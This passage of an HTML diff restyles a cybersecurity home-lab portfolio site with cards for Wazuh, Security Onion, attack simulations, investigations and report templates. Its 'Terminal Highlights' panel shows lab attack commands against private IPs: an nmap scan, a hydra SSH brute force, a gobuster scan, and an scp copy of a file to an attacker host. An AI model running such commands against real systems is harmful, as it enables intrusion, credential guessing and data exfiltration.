               <div class="meta"><span class="pill">infrastructure/</span><span class="pill">07-security-onion.md</span></div>
               <h3>Security Onion</h3>
               <p>IDS setup, sensor placement, hunting interface, and how network detections enter the analyst workflow.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Wazuh SIEM" data-subtitle="infrastructure/08-wazuh.md" data-description="Centralized detection, host log ingestion, and the main SOC alerting layer for your portfolio stories." data-details="agent coverage|alerting|SIEM dashboards|host telemetry ingestion" data-labels="infrastructure/,08-wazuh.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Wazuh SIEM"
+            data-labels="infrastructure/, 08-wazuh.md"
+            data-description="Centralized detection, host log ingestion, and the main SOC alerting layer for your portfolio stories."
+            data-details="Agent coverage|Alerting|SIEM dashboards">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">infrastructure/</span><span class="pill">08-wazuh.md</span></div>
               <h3>Wazuh SIEM</h3>
               <p>Centralized detection, host log ingestion, and the main SOC alerting layer for your portfolio stories.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
@@ -1324,38 +1231,57 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Detection Strategy" data-subtitle="detections/00-detection-strategy.md" data-description="Coverage goals, telemetry sources, ATT&CK priorities, and how the lab decides what to detect first." data-details="intentional design|links infra to detections|roadmap planning|coverage priorities" data-labels="detections/,00-detection-strategy.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Detection Strategy"
+            data-labels="detections/, 00-detection-strategy.md"
+            data-description="Coverage goals, telemetry sources, ATT&CK priorities, and how the lab decides what to detect first."
+            data-details="Intentional design|Links infra to detections|Supports roadmap planning">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">detections/</span><span class="pill">00-detection-strategy.md</span></div>
               <h3>Detection Strategy</h3>
               <p>Coverage goals, telemetry sources, ATT&amp;CK priorities, and how the lab decides what to detect first.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Wazuh Rules" data-subtitle="detections/01-wazuh-rules.md" data-description="Custom host-based alerts for authentication anomalies, suspicious process execution, and lab-specific detection logic." data-details="rule IDs|alert screenshots|sample event payloads|host-based correlation" data-labels="detections/,01-wazuh-rules.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Wazuh Rules"
+            data-labels="detections/, 01-wazuh-rules.md"
+            data-description="Custom host-based alerts for authentication anomalies, suspicious process execution, and lab-specific detection logic."
+            data-details="Rule IDs|Alert screenshots|Sample event payloads">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">detections/</span><span class="pill">01-wazuh-rules.md</span></div>
               <h3>Wazuh Rules</h3>
               <p>Custom host-based alerts for authentication anomalies, suspicious process execution, and lab-specific detection logic.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Sysmon Coverage" data-subtitle="detections/02-sysmon.md" data-description="Windows telemetry strategy for process creation, network connections, and host activity needed for investigations." data-details="event IDs|config highlights|host evidence samples|Windows investigation support" data-labels="detections/,02-sysmon.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Sysmon Coverage"
+            data-labels="detections/, 02-sysmon.md"
+            data-description="Windows telemetry strategy for process creation, network connections, and host activity needed for investigations."
+            data-details="Event IDs|Config highlights|Host evidence samples">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">detections/</span><span class="pill">02-sysmon.md</span></div>
               <h3>Sysmon Coverage</h3>
               <p>Windows telemetry strategy for process creation, network connections, and host activity needed for investigations.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Security Onion Hunts" data-subtitle="detections/03-security-onion-hunts.md" data-description="Hunt workflows for network scans, suspicious traffic, and correlation between Suricata alerts and Zeek logs." data-details="hunt queries|alert triage flow|network pivots|IDS-to-hunt workflow" data-labels="detections/,03-security-onion-hunts.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Security Onion Hunts"
+            data-labels="detections/, 03-security-onion-hunts.md"
+            data-description="Hunt workflows for network scans, suspicious traffic, and correlation between Suricata alerts and Zeek logs."
+            data-details="Hunt queries|Alert triage flow|Network pivots">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">detections/</span><span class="pill">03-security-onion-hunts.md</span></div>
               <h3>Security Onion Hunts</h3>
               <p>Hunt workflows for network scans, suspicious traffic, and correlation between Suricata alerts and Zeek logs.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
@@ -1369,54 +1295,83 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Reconnaissance" data-subtitle="simulations/01-reconnaissance.md" data-description="Nmap-style discovery, service probing, and the first signs of hostile awareness inside the lab." data-details="scan activity|Suricata / Zeek detections|T1046 mapping|good recruiter demo scenario" data-labels="simulations/,01-reconnaissance.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Reconnaissance"
+            data-labels="simulations/, 01-reconnaissance.md"
+            data-description="Nmap-style discovery, service probing, and the first signs of hostile awareness inside the lab."
+            data-details="Scan activity|Suricata / Zeek detections|T1046 mapping">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">simulations/</span><span class="pill">01-reconnaissance.md</span></div>
               <h3>Reconnaissance</h3>
               <p>Nmap-style discovery, service probing, and the first signs of hostile awareness inside the lab.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Brute Force" data-subtitle="simulations/02-bruteforce.md" data-description="Linux SSH and Windows logon failure scenarios designed for strong SIEM evidence and analyst reports." data-details="Hydra attempts|auth.log evidence|Event ID 4625|strong case-building scenario" data-labels="simulations/,02-bruteforce.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Brute Force"
+            data-labels="simulations/, 02-bruteforce.md"
+            data-description="Linux SSH and Windows logon failure scenarios designed for strong SIEM evidence and analyst reports."
+            data-details="Hydra attempts|auth.log evidence|Event ID 4625">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">simulations/</span><span class="pill">02-bruteforce.md</span></div>
               <h3>Brute Force</h3>
               <p>Linux SSH and Windows logon failure scenarios designed for strong SIEM evidence and analyst reports.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Lateral Movement" data-subtitle="simulations/03-lateral-movement.md" data-description="Remote execution style behavior that proves the lab can model post-compromise analyst thinking." data-details="PsExec or WMI|Sysmon process traces|T1021 mapping|post-compromise workflow" data-labels="simulations/,03-lateral-movement.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Lateral Movement"
+            data-labels="simulations/, 03-lateral-movement.md"
+            data-description="Remote execution style behavior that proves the lab can model post-compromise analyst thinking."
+            data-details="PsExec or WMI|Sysmon process traces|T1021 mapping">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">simulations/</span><span class="pill">03-lateral-movement.md</span></div>
               <h3>Lateral Movement</h3>
               <p>Remote execution style behavior that proves the lab can model post-compromise analyst thinking.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Privilege Escalation" data-subtitle="simulations/04-privilege-escalation.md" data-description="Linux or Windows privilege abuse scenarios tied to host telemetry and suspicious activity review." data-details="sudo misuse|elevated activity|T1068 mapping|host-based escalation evidence" data-labels="simulations/,04-privilege-escalation.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Privilege Escalation"
+            data-labels="simulations/, 04-privilege-escalation.md"
+            data-description="Linux or Windows privilege abuse scenarios tied to host telemetry and suspicious activity review."
+            data-details="sudo misuse|Elevated activity|T1068 mapping">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">simulations/</span><span class="pill">04-privilege-escalation.md</span></div>
               <h3>Privilege Escalation</h3>
               <p>Linux or Windows privilege abuse scenarios tied to host telemetry and suspicious activity review.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Persistence" data-subtitle="simulations/05-persistence.md" data-description="Scheduled tasks, startup abuse, or account changes that demonstrate long-lived detection coverage." data-details="schtasks|new user creation|persistence artifacts|long-lived attacker behavior" data-labels="simulations/,05-persistence.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Persistence"
+            data-labels="simulations/, 05-persistence.md"
+            data-description="Scheduled tasks, startup abuse, or account changes that demonstrate long-lived detection coverage."
+            data-details="schtasks|New user creation|Persistence artifacts">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">simulations/</span><span class="pill">05-persistence.md</span></div>
               <h3>Persistence</h3>
               <p>Scheduled tasks, startup abuse, or account changes that demonstrate long-lived detection coverage.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Linux Attacks" data-subtitle="simulations/06-linux-attacks.md" data-description="Linux-centric attack activity covering auth abuse, shell execution, privilege actions, and host log evidence." data-details="auth anomalies|shell commands|forensic log pivots|Linux analyst casework" data-labels="simulations/,06-linux-attacks.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Linux Attacks"
+            data-labels="simulations/, 06-linux-attacks.md"
+            data-description="Linux-centric attack activity covering auth abuse, shell execution, privilege actions, and host log evidence."
+            data-details="auth anomalies|Shell commands|Forensic log pivots">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">simulations/</span><span class="pill">06-linux-attacks.md</span></div>
               <h3>Linux Attacks</h3>
               <p>Linux-centric attack activity covering auth abuse, shell execution, privilege actions, and host log evidence.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
@@ -1430,38 +1385,57 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Investigation Method" data-subtitle="investigations/00-investigation-method.md" data-description="The repeatable analyst process from alert validation through MITRE mapping and final incident summary." data-details="alert review|evidence validation|case documentation|MITRE-based reporting" data-labels="investigations/,00-investigation-method.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Investigation Method"
+            data-labels="investigations/, 00-investigation-method.md"
+            data-description="The repeatable analyst process from alert validation through MITRE mapping and final incident summary."
+            data-details="Alert review|Evidence validation|Case documentation">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">investigations/</span><span class="pill">00-investigation-method.md</span></div>
               <h3>Investigation Method</h3>
               <p>The repeatable analyst process from alert validation through MITRE mapping and final incident summary.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="SSH Brute Force Case" data-subtitle="investigations/01-ssh-bruteforce-case.md" data-description="One of the strongest recruiter-facing investigations because it clearly shows logs, SIEM correlation, and conclusion." data-details="auth.log screenshot|Wazuh alert|T1110 mapping|case conclusion" data-labels="investigations/,01-ssh-bruteforce-case.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="SSH Brute Force Case"
+            data-labels="investigations/, 01-ssh-bruteforce-case.md"
+            data-description="One of the strongest recruiter-facing investigations because it clearly shows logs, SIEM correlation, and conclusion."
+            data-details="auth.log screenshot|Wazuh alert|T1110 mapping">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">investigations/</span><span class="pill">01-ssh-bruteforce-case.md</span></div>
               <h3>SSH Brute Force Case</h3>
               <p>One of the strongest recruiter-facing investigations because it clearly shows logs, SIEM correlation, and conclusion.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Windows Logon Case" data-subtitle="investigations/02-windows-logon-case.md" data-description="Failed logon evidence from Windows Security logs, Sysmon coverage, and host context useful for SOC interviews." data-details="4625 evidence|user and host context|analyst notes|Windows triage workflow" data-labels="investigations/,02-windows-logon-case.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Windows Logon Case"
+            data-labels="investigations/, 02-windows-logon-case.md"
+            data-description="Failed logon evidence from Windows Security logs, Sysmon coverage, and host context useful for SOC interviews."
+            data-details="4625 evidence|User and host context|Analyst notes">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">investigations/</span><span class="pill">02-windows-logon-case.md</span></div>
               <h3>Windows Logon Case</h3>
               <p>Failed logon evidence from Windows Security logs, Sysmon coverage, and host context useful for SOC interviews.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="PowerShell Case" data-subtitle="investigations/03-powershell-case.md" data-description="Windows script execution style casework that makes the portfolio feel closer to real-world blue-team investigations." data-details="Sysmon process creation|command-line evidence|T1059 mapping|script execution investigation" data-labels="investigations/,03-powershell-case.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="PowerShell Case"
+            data-labels="investigations/, 03-powershell-case.md"
+            data-description="Windows script execution style casework that makes the portfolio feel closer to real-world blue-team investigations."
+            data-details="Sysmon process creation|Command-line evidence|T1059 mapping">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">investigations/</span><span class="pill">03-powershell-case.md</span></div>
               <h3>PowerShell Case</h3>
               <p>Windows script execution style casework that makes the portfolio feel closer to real-world blue-team investigations.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
@@ -1475,257 +1449,81 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Weekly SOC Report" data-subtitle="reports/00-weekly-soc-report-template.md" data-description="Reusable reporting structure for top alerts, notable trends, prioritized detections, and actions taken." data-details="shows communication skill|good for managers|easy to adapt to real work|weekly reporting structure" data-labels="reports/,00-weekly-soc-report-template.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Weekly SOC Report"
+            data-labels="reports/, 00-weekly-soc-report-template.md"
+            data-description="Reusable reporting structure for top alerts, notable trends, prioritized detections, and actions taken."
+            data-details="Shows communication skill|Good for managers|Easy to adapt to real work">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">reports/</span><span class="pill">00-weekly-soc-report-template.md</span></div>
               <h3>Weekly SOC Report</h3>
               <p>Reusable reporting structure for top alerts, notable trends, prioritized detections, and actions taken.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Incident Report Template" data-subtitle="reports/01-incident-report-template.md" data-description="Clear structure for evidence, scope, ATT&CK mapping, severity, and recommended next steps." data-details="attach case evidence|add screenshots|summarize impact|ready-to-use incident format" data-labels="reports/,01-incident-report-template.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Incident Report Template"
+            data-labels="reports/, 01-incident-report-template.md"
+            data-description="Clear structure for evidence, scope, ATT&CK mapping, severity, and recommended next steps."
+            data-details="Attach case evidence|Add screenshots|Summarize impact">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">reports/</span><span class="pill">01-incident-report-template.md</span></div>
               <h3>Incident Report Template</h3>
               <p>Clear structure for evidence, scope, ATT&amp;CK mapping, severity, and recommended next steps.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="MITRE Coverage Matrix" data-subtitle="reports/02-mitre-coverage-matrix.md" data-description="Coverage view linking simulations, detections, and investigations to ATT&CK techniques across the project." data-details="show detection maturity|prove structured thinking|highlight future gaps|coverage by technique" data-labels="reports/,02-mitre-coverage-matrix.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="MITRE Coverage Matrix"
+            data-labels="reports/, 02-mitre-coverage-matrix.md"
+            data-description="Coverage view linking simulations, detections, and investigations to ATT&CK techniques across the project."
+            data-details="Show detection maturity|Prove structured thinking|Highlight future gaps">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">reports/</span><span class="pill">02-mitre-coverage-matrix.md</span></div>
               <h3>MITRE Coverage Matrix</h3>
               <p>Coverage view linking simulations, detections, and investigations to ATT&amp;CK techniques across the project.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
   </section>
 
-<section>
-  <div class="container">
-    <div class="highlight-grid">
-      <div class="panel">
-        <h3>Repository Walkthrough Timeline</h3>
-        <div class="timeline">
-          <div class="step">
-            <div class="step-num">1</div>
-            <div><h3>Scope the Lab</h3><p>Start with project scope, lab inventory, and architecture so the lab has a clear enterprise story.</p></div>
-          </div>
-          <div class="step">
-            <div class="step-num">2</div>
-            <div><h3>Build the Infrastructure</h3><p>Deploy Windows Server, Windows client, Ubuntu, Kali, Security Onion, and Wazuh in a repeatable order.</p></div>
-          </div>
-          <div class="step">
-            <div class="step-num">3</div>
-            <div><h3>Implement Detections</h3><p>Add Wazuh rules, Sysmon coverage, and Security Onion hunts that support your selected attack stories.</p></div>
-          </div>
-          <div class="step">
-            <div class="step-num">4</div>
-            <div><h3>Run Simulations and Cases</h3><p>Execute controlled attacks, collect screenshots, investigate alerts, and write incident reports.</p></div>
-          </div>
-        </div>
-
-        <div class="frame-grid">
-          <div class="sample-frame">
-            <div class="sample-frame-head">
-              <span>docs/04-threat-model.md</span>
-              <div class="sample-dots"><span></span><span></span><span></span></div>
+  <section>
+    <div class="container">
+      <div class="highlight-grid">
+        <div class="panel">
+          <h3>Repository Walkthrough Timeline</h3>
+          <div class="timeline">
+            <div class="step">
+              <div class="step-num">1</div>
+              <div><h3>Scope the Lab</h3><p>Start with project scope, lab inventory, and architecture so the lab has a clear enterprise story.</p></div>
             </div>
-            <div class="sample-frame-body">
-              Threat priorities, monitored assets, initial access assumptions, and top ATT&amp;CK techniques for the lab.
-              <div class="sample-bars" style="margin-top:12px;">
-                <span></span><span></span><span></span><span></span>
-              </div>
+            <div class="step">
+              <div class="step-num">2</div>
+              <div><h3>Build the Infrastructure</h3><p>Deploy Windows Server, Windows client, Ubuntu, Kali, Security Onion, and Wazuh in a repeatable order.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">3</div>
+              <div><h3>Implement Detections</h3><p>Add Wazuh rules, Sysmon coverage, and Security Onion hunts that support your selected attack stories.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">4</div>
+              <div><h3>Run Simulations and Cases</h3><p>Execute controlled attacks, collect screenshots, investigate alerts, and write incident reports.</p></div>
             </div>
           </div>
 
-          <div class="sample-frame">
-            <div class="sample-frame-head">
-              <span>reports/01-incident-report-template.md</span>
-              <div class="sample-dots"><span></span><span></span><span></span></div>
-            </div>
-            <div class="sample-frame-body">
-              Severity, source IP, affected host, evidence screenshots, ATT&amp;CK mapping, and containment notes.
-              <div class="sample-bars" style="margin-top:12px;">
-                <span></span><span></span><span></span><span></span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="panel">
-        <h3>Terminal Highlights</h3>
-        <p>This panel gives the site the lab-operation feel you wanted and can later be replaced with a real walkthrough video of the repository, attack flow, and alert evidence.</p>
-        <div class="terminal">
-          <div><span class="prompt">$</span> <span class="cmd">nmap -sS -T4 192.168.20.0/24</span></div>
-          <div><span class="prompt">$</span> <span class="cmd">hydra -l root -P rockyou.txt ssh://192.168.20.10</span></div>
-          <div><span class="prompt">$</span> <span class="cmd">gobuster dir -u http://192.168.20.20 -w common.txt</span></div>
-          <div><span class="prompt">$</span> <span class="cmd">scp sensitivefile attacker@kali:/tmp</span></div>
-        </div>
-
-        <div class="frame-grid">
-          <div class="sample-frame">
-            <div class="sample-frame-head">
-              <span>Sample SIEM frame</span>
-              <div class="sample-dots"><span></span><span></span><span></span></div>
-            </div>
-            <div class="sample-frame-body">
-              Alert: Multiple failed authentications detected from 192.168.20.50 against Linux SSH service.
-              <div class="sample-bars" style="margin-top:12px;">
-                <span></span><span></span><span></span><span></span>
-              </div>
-            </div>
-          </div>
-
-          <div class="sample-frame">
-            <div class="sample-frame-head">
-              <span>Sample evidence frame</span>
-              <div class="sample-dots"><span></span><span></span><span></span></div>
-            </div>
-            <div class="sample-frame-body">
-              Event ID 4625 burst, matching failed-login sequence, mapped to brute force behavior for analyst review.
-              <div class="sample-bars" style="margin-top:12px;">
-                <span></span><span></span><span></span><span></span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="evidence">
-  <div class="container">
-    <div class="section-head">
-      <h2>Evidence Gallery</h2>
-      <p>These placeholders are designed to match your screenshot checklist and execution checklist so the website stays aligned with the rest of the repository.</p>
-    </div>
-
-    <div class="frame-grid" style="margin-bottom:16px;">
-      <div class="sample-frame">
-        <div class="sample-frame-head">
-          <span>Sample architecture frame</span>
-          <div class="sample-dots"><span></span><span></span><span></span></div>
-        </div>
-        <div class="sample-frame-body">
-          Use this frame for a clean topology preview showing attacker, Windows Server, Windows client, Ubuntu, Security Onion, and Wazuh.
-          <div class="sample-bars" style="margin-top:12px;">
-            <span></span><span></span><span></span><span></span>
-          </div>
-        </div>
-      </div>
-
-      <div class="sample-frame">
-        <div class="sample-frame-head">
-          <span>Sample incident frame</span>
-          <div class="sample-dots"><span></span><span></span><span></span></div>
-        </div>
-        <div class="sample-frame-body">
-          Use this frame for a SIEM alert preview, analyst note, or short incident summary that helps flesh out the page visually.
-          <div class="sample-bars" style="margin-top:12px;">
-            <span></span><span></span><span></span><span></span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="gallery">
-      <div class="shot modal-card" tabindex="0"
-           data-title="Architecture Diagram"
-           data-labels="architecture/, diagrams/, topology"
-           data-description="Sample architecture preview modal showing how your network zones, monitored hosts, and detection stack can be presented inside the website."
-           data-details="Show attacker, server, client, Ubuntu, Security Onion, and Wazuh relationships|Add IP ranges and arrows for telemetry flow|Use this as the visual anchor for the entire project.">
-        <span class="shot-label">Architecture Diagram</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="Wazuh Dashboard Overview"
-           data-labels="wazuh, siem, alerts"
-           data-description="Sample dashboard preview with room for alert counts, severity distribution, and recent detections across monitored hosts."
-           data-details="Highlight authentication anomalies and host coverage|Show alert severity and recent activity|Use one clean screenshot with visible filters and timestamps.">
-        <span class="shot-label">Wazuh Dashboard Overview</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="Security Onion Alerts"
-           data-labels="security onion, suricata, zeek"
-           data-description="Sample modal for network detections captured through Security Onion during simulations or hunts."
-           data-details="Show alert title, source IP, destination IP, and protocol|Pair with one short case explanation|Use this to support reconnaissance and traffic investigation stories.">
-        <span class="shot-label">Security Onion Alerts</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="Suricata Nmap Detection"
-           data-labels="suricata, t1046, reconnaissance"
-           data-description="Sample modal for an Nmap detection story tied to ATT&amp;CK technique T1046 and network service discovery."
-           data-details="Show rule name and timestamp|Add attacker IP and target range|Link this frame to your reconnaissance simulation file.">
-        <span class="shot-label">Suricata Nmap Detection</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="Linux auth.log Brute Force"
-           data-labels="linux, auth.log, t1110"
-           data-description="Sample log evidence frame for repeated failed SSH logins and source-IP correlation inside the SIEM workflow."
-           data-details="Show 3–5 repeated failed password entries|Pair with Hydra command evidence|Use this as the strongest Linux investigation screenshot.">
-        <span class="shot-label">Linux auth.log Brute Force</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="Windows Event ID 4625"
-           data-labels="windows, event 4625, authentication"
-           data-description="Sample modal for Windows failed logon evidence pulled from Event Viewer or centralized collection."
-           data-details="Show host name, account, and source network context|Use Sysmon or Wazuh correlation nearby|Tie it to your Windows logon case file.">
-        <span class="shot-label">Windows Event ID 4625</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="MITRE ATT&amp;CK Mapping"
-           data-labels="mitre, coverage, reporting"
-           data-description="Sample modal for technique mapping that connects your simulations, detections, and investigation reports to ATT&amp;CK."
-           data-details="Show T1046, T1110, T1021, and T1059 mappings|Use this in reports and detection strategy|Keep the layout clean and readable.">
-        <span class="shot-label">MITRE ATT&amp;CK Mapping</span>
-      </div>
-
-      <div class="shot modal-card" tabindex="0"
-           data-title="Incident Report Summary"
-           data-labels="report, evidence, conclusion"
-           data-description="Sample incident-summary modal with severity, evidence links, analyst conclusion, and suggested next steps."
-           data-details="Add alert source and affected asset|Embed screenshot references and ATT&amp;CK mapping|Use this frame to demonstrate analyst communication quality.">
-        <span class="shot-label">Incident Report Summary</span>
-      </div>
-    </div>
-  </div>
-</section>
-
-<div class="modal" id="cardModal" aria-hidden="true" role="dialog" aria-modal="true" data-close="true">
-  <div class="modal-dialog">
-    <div class="modal-hero"></div>
-    <div class="modal-content">
-      <div class="modal-top">
-        <div>
-          <h2 id="modalTitle" style="margin:0;">Preview</h2>
-          <div class="modal-meta" id="modalMeta"></div>
-        </div>
-        <button class="modal-close" id="modalClose" type="button" data-close="true" aria-label="Close preview">✕</button>
-      </div>
-
-      <div class="modal-layout">
-        <div>
-          <p id="modalDescription">Sample evidence description appears here.</p>
-
-          <div class="frame-grid" style="margin-top:16px;">
+          <div class="frame-grid">
             <div class="sample-frame">
               <div class="sample-frame-head">
-                <span>Preview frame</span>
+                <span>docs/04-threat-model.md</span>
                 <div class="sample-dots"><span></span><span></span><span></span></div>
               </div>
               <div class="sample-frame-body">
-                Replace this area with a real screenshot, cropped dashboard image, terminal capture, or investigation view from the repository website.
+                Threat priorities, monitored assets, initial access assumptions, and top ATT&amp;CK techniques for the lab.
                 <div class="sample-bars" style="margin-top:12px;">
                   <span></span><span></span><span></span><span></span>
                 </div>
@@ -1734,210 +1532,356 @@ section {
 
             <div class="sample-frame">
               <div class="sample-frame-head">
-                <span>Command / analyst note</span>
+                <span>reports/01-incident-report-template.md</span>
                 <div class="sample-dots"><span></span><span></span><span></span></div>
               </div>
               <div class="sample-frame-body">
-                Use the second frame for the related command, SIEM note, MITRE tag, or the short analyst explanation that supports the preview.
+                Severity, source IP, affected host, evidence screenshots, ATT&amp;CK mapping, and containment notes.
+                <div class="sample-bars" style="margin-top:12px;">
+                  <span></span><span></span><span></span><span></span>
+                </div>
               </div>
             </div>
           </div>
         </div>
 
-        <aside class="modal-side">
-          <h4>Highlights</h4>
-          <ul id="modalList">
-            <li>Sample detail</li>
-            <li>Another supporting point</li>
-            <li>Use this area for evidence notes.</li>
-          </ul>
-        </aside>
+        <div class="panel">
+          <h3>Terminal Highlights</h3>
+          <p>This panel gives the site the lab-operation feel you wanted and can later be replaced with a real walkthrough video of the repository, attack flow, and alert evidence.</p>
+          <div class="terminal">
+            <div><span class="prompt">$</span> <span class="cmd">nmap -sS -T4 192.168.20.0/24</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">hydra -l root -P rockyou.txt ssh://192.168.20.10</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">gobuster dir -u http://192.168.20.20 -w common.txt</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">scp sensitivefile attacker@kali:/tmp</span></div>
+          </div>
+
+          <div class="frame-grid">
+            <div class="sample-frame">
+              <div class="sample-frame-head">
+                <span>Sample SIEM frame</span>
+                <div class="sample-dots"><span></span><span></span><span></span></div>
+              </div>
+              <div class="sample-frame-body">
+                Alert: Multiple failed authentications detected from 192.168.20.50 against Linux SSH service.
+                <div class="sample-bars" style="margin-top:12px;">
+                  <span></span><span></span><span></span><span></span>
+                </div>
+              </div>
+            </div>
+
+            <div class="sample-frame">
+              <div class="sample-frame-head">
+                <span>Sample evidence frame</span>
+                <div class="sample-dots"><span></span><span></span><span></span></div>
+              </div>
+              <div class="sample-frame-body">
+                Event ID 4625 burst, matching failed-login sequence, mapped to brute force behavior for analyst review.
+                <div class="sample-bars" style="margin-top:12px;">
+                  <span></span><span></span><span></span><span></span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="evidence">
+    <div class="container">
+      <div class="section-head">
+        <h2>Evidence Gallery</h2>
+        <p>These placeholders are designed to match your screenshot checklist and execution checklist so the website stays aligned with the rest of the repository.</p>
+      </div>
+
+      <div class="frame-grid" style="margin-bottom:16px;">
+        <div class="sample-frame">
+          <div class="sample-frame-head">
+            <span>Sample architecture frame</span>
+            <div class="sample-dots"><span></span><span></span><span></span></div>
+          </div>
+          <div class="sample-frame-body">
+            Use this frame for a clean topology preview showing attacker, Windows Server, Windows client, Ubuntu, Security Onion, and Wazuh.
+            <div class="sample-bars" style="margin-top:12px;">
+              <span></span><span></span><span></span><span></span>
+            </div>
+          </div>
+        </div>
+
+        <div class="sample-frame">
+          <div class="sample-frame-head">
+            <span>Sample incident frame</span>
+            <div class="sample-dots"><span></span><span></span><span></span></div>
+          </div>
+          <div class="sample-frame-body">
+            Use this frame for a SIEM alert preview, analyst note, or short incident summary that helps flesh out the page visually.
+            <div class="sample-bars" style="margin-top:12px;">
+              <span></span><span></span><span></span><span></span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="gallery">
+        <div class="shot modal-card" tabindex="0"
+             data-title="Architecture Diagram"
+             data-labels="architecture/, diagrams/, topology"
+             data-description="Sample architecture preview modal showing how your network zones, monitored hosts, and detection stack can be presented inside the website."
+             data-details="Show attacker, server, client, Ubuntu, Security Onion, and Wazuh relationships|Add IP ranges and arrows for telemetry flow|Use this as the visual anchor for the entire project.">
+          <span class="shot-label">Architecture Diagram</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="Wazuh Dashboard Overview"
+             data-labels="wazuh, siem, alerts"
+             data-description="Sample dashboard preview with room for alert counts, severity distribution, and recent detections across monitored hosts."
+             data-details="Highlight authentication anomalies and host coverage|Show alert severity and recent activity|Use one clean screenshot with visible filters and timestamps.">
+          <span class="shot-label">Wazuh Dashboard Overview</span>
+        </div>
+
+        <div class="shot modal-card" tabindex="0"
+             data-title="Security Onion Alerts"
+             data-labels="security onion, suricata, zeek"
+             data-description="Sample modal for network detections captured through Security Onion during simulations or hunts."
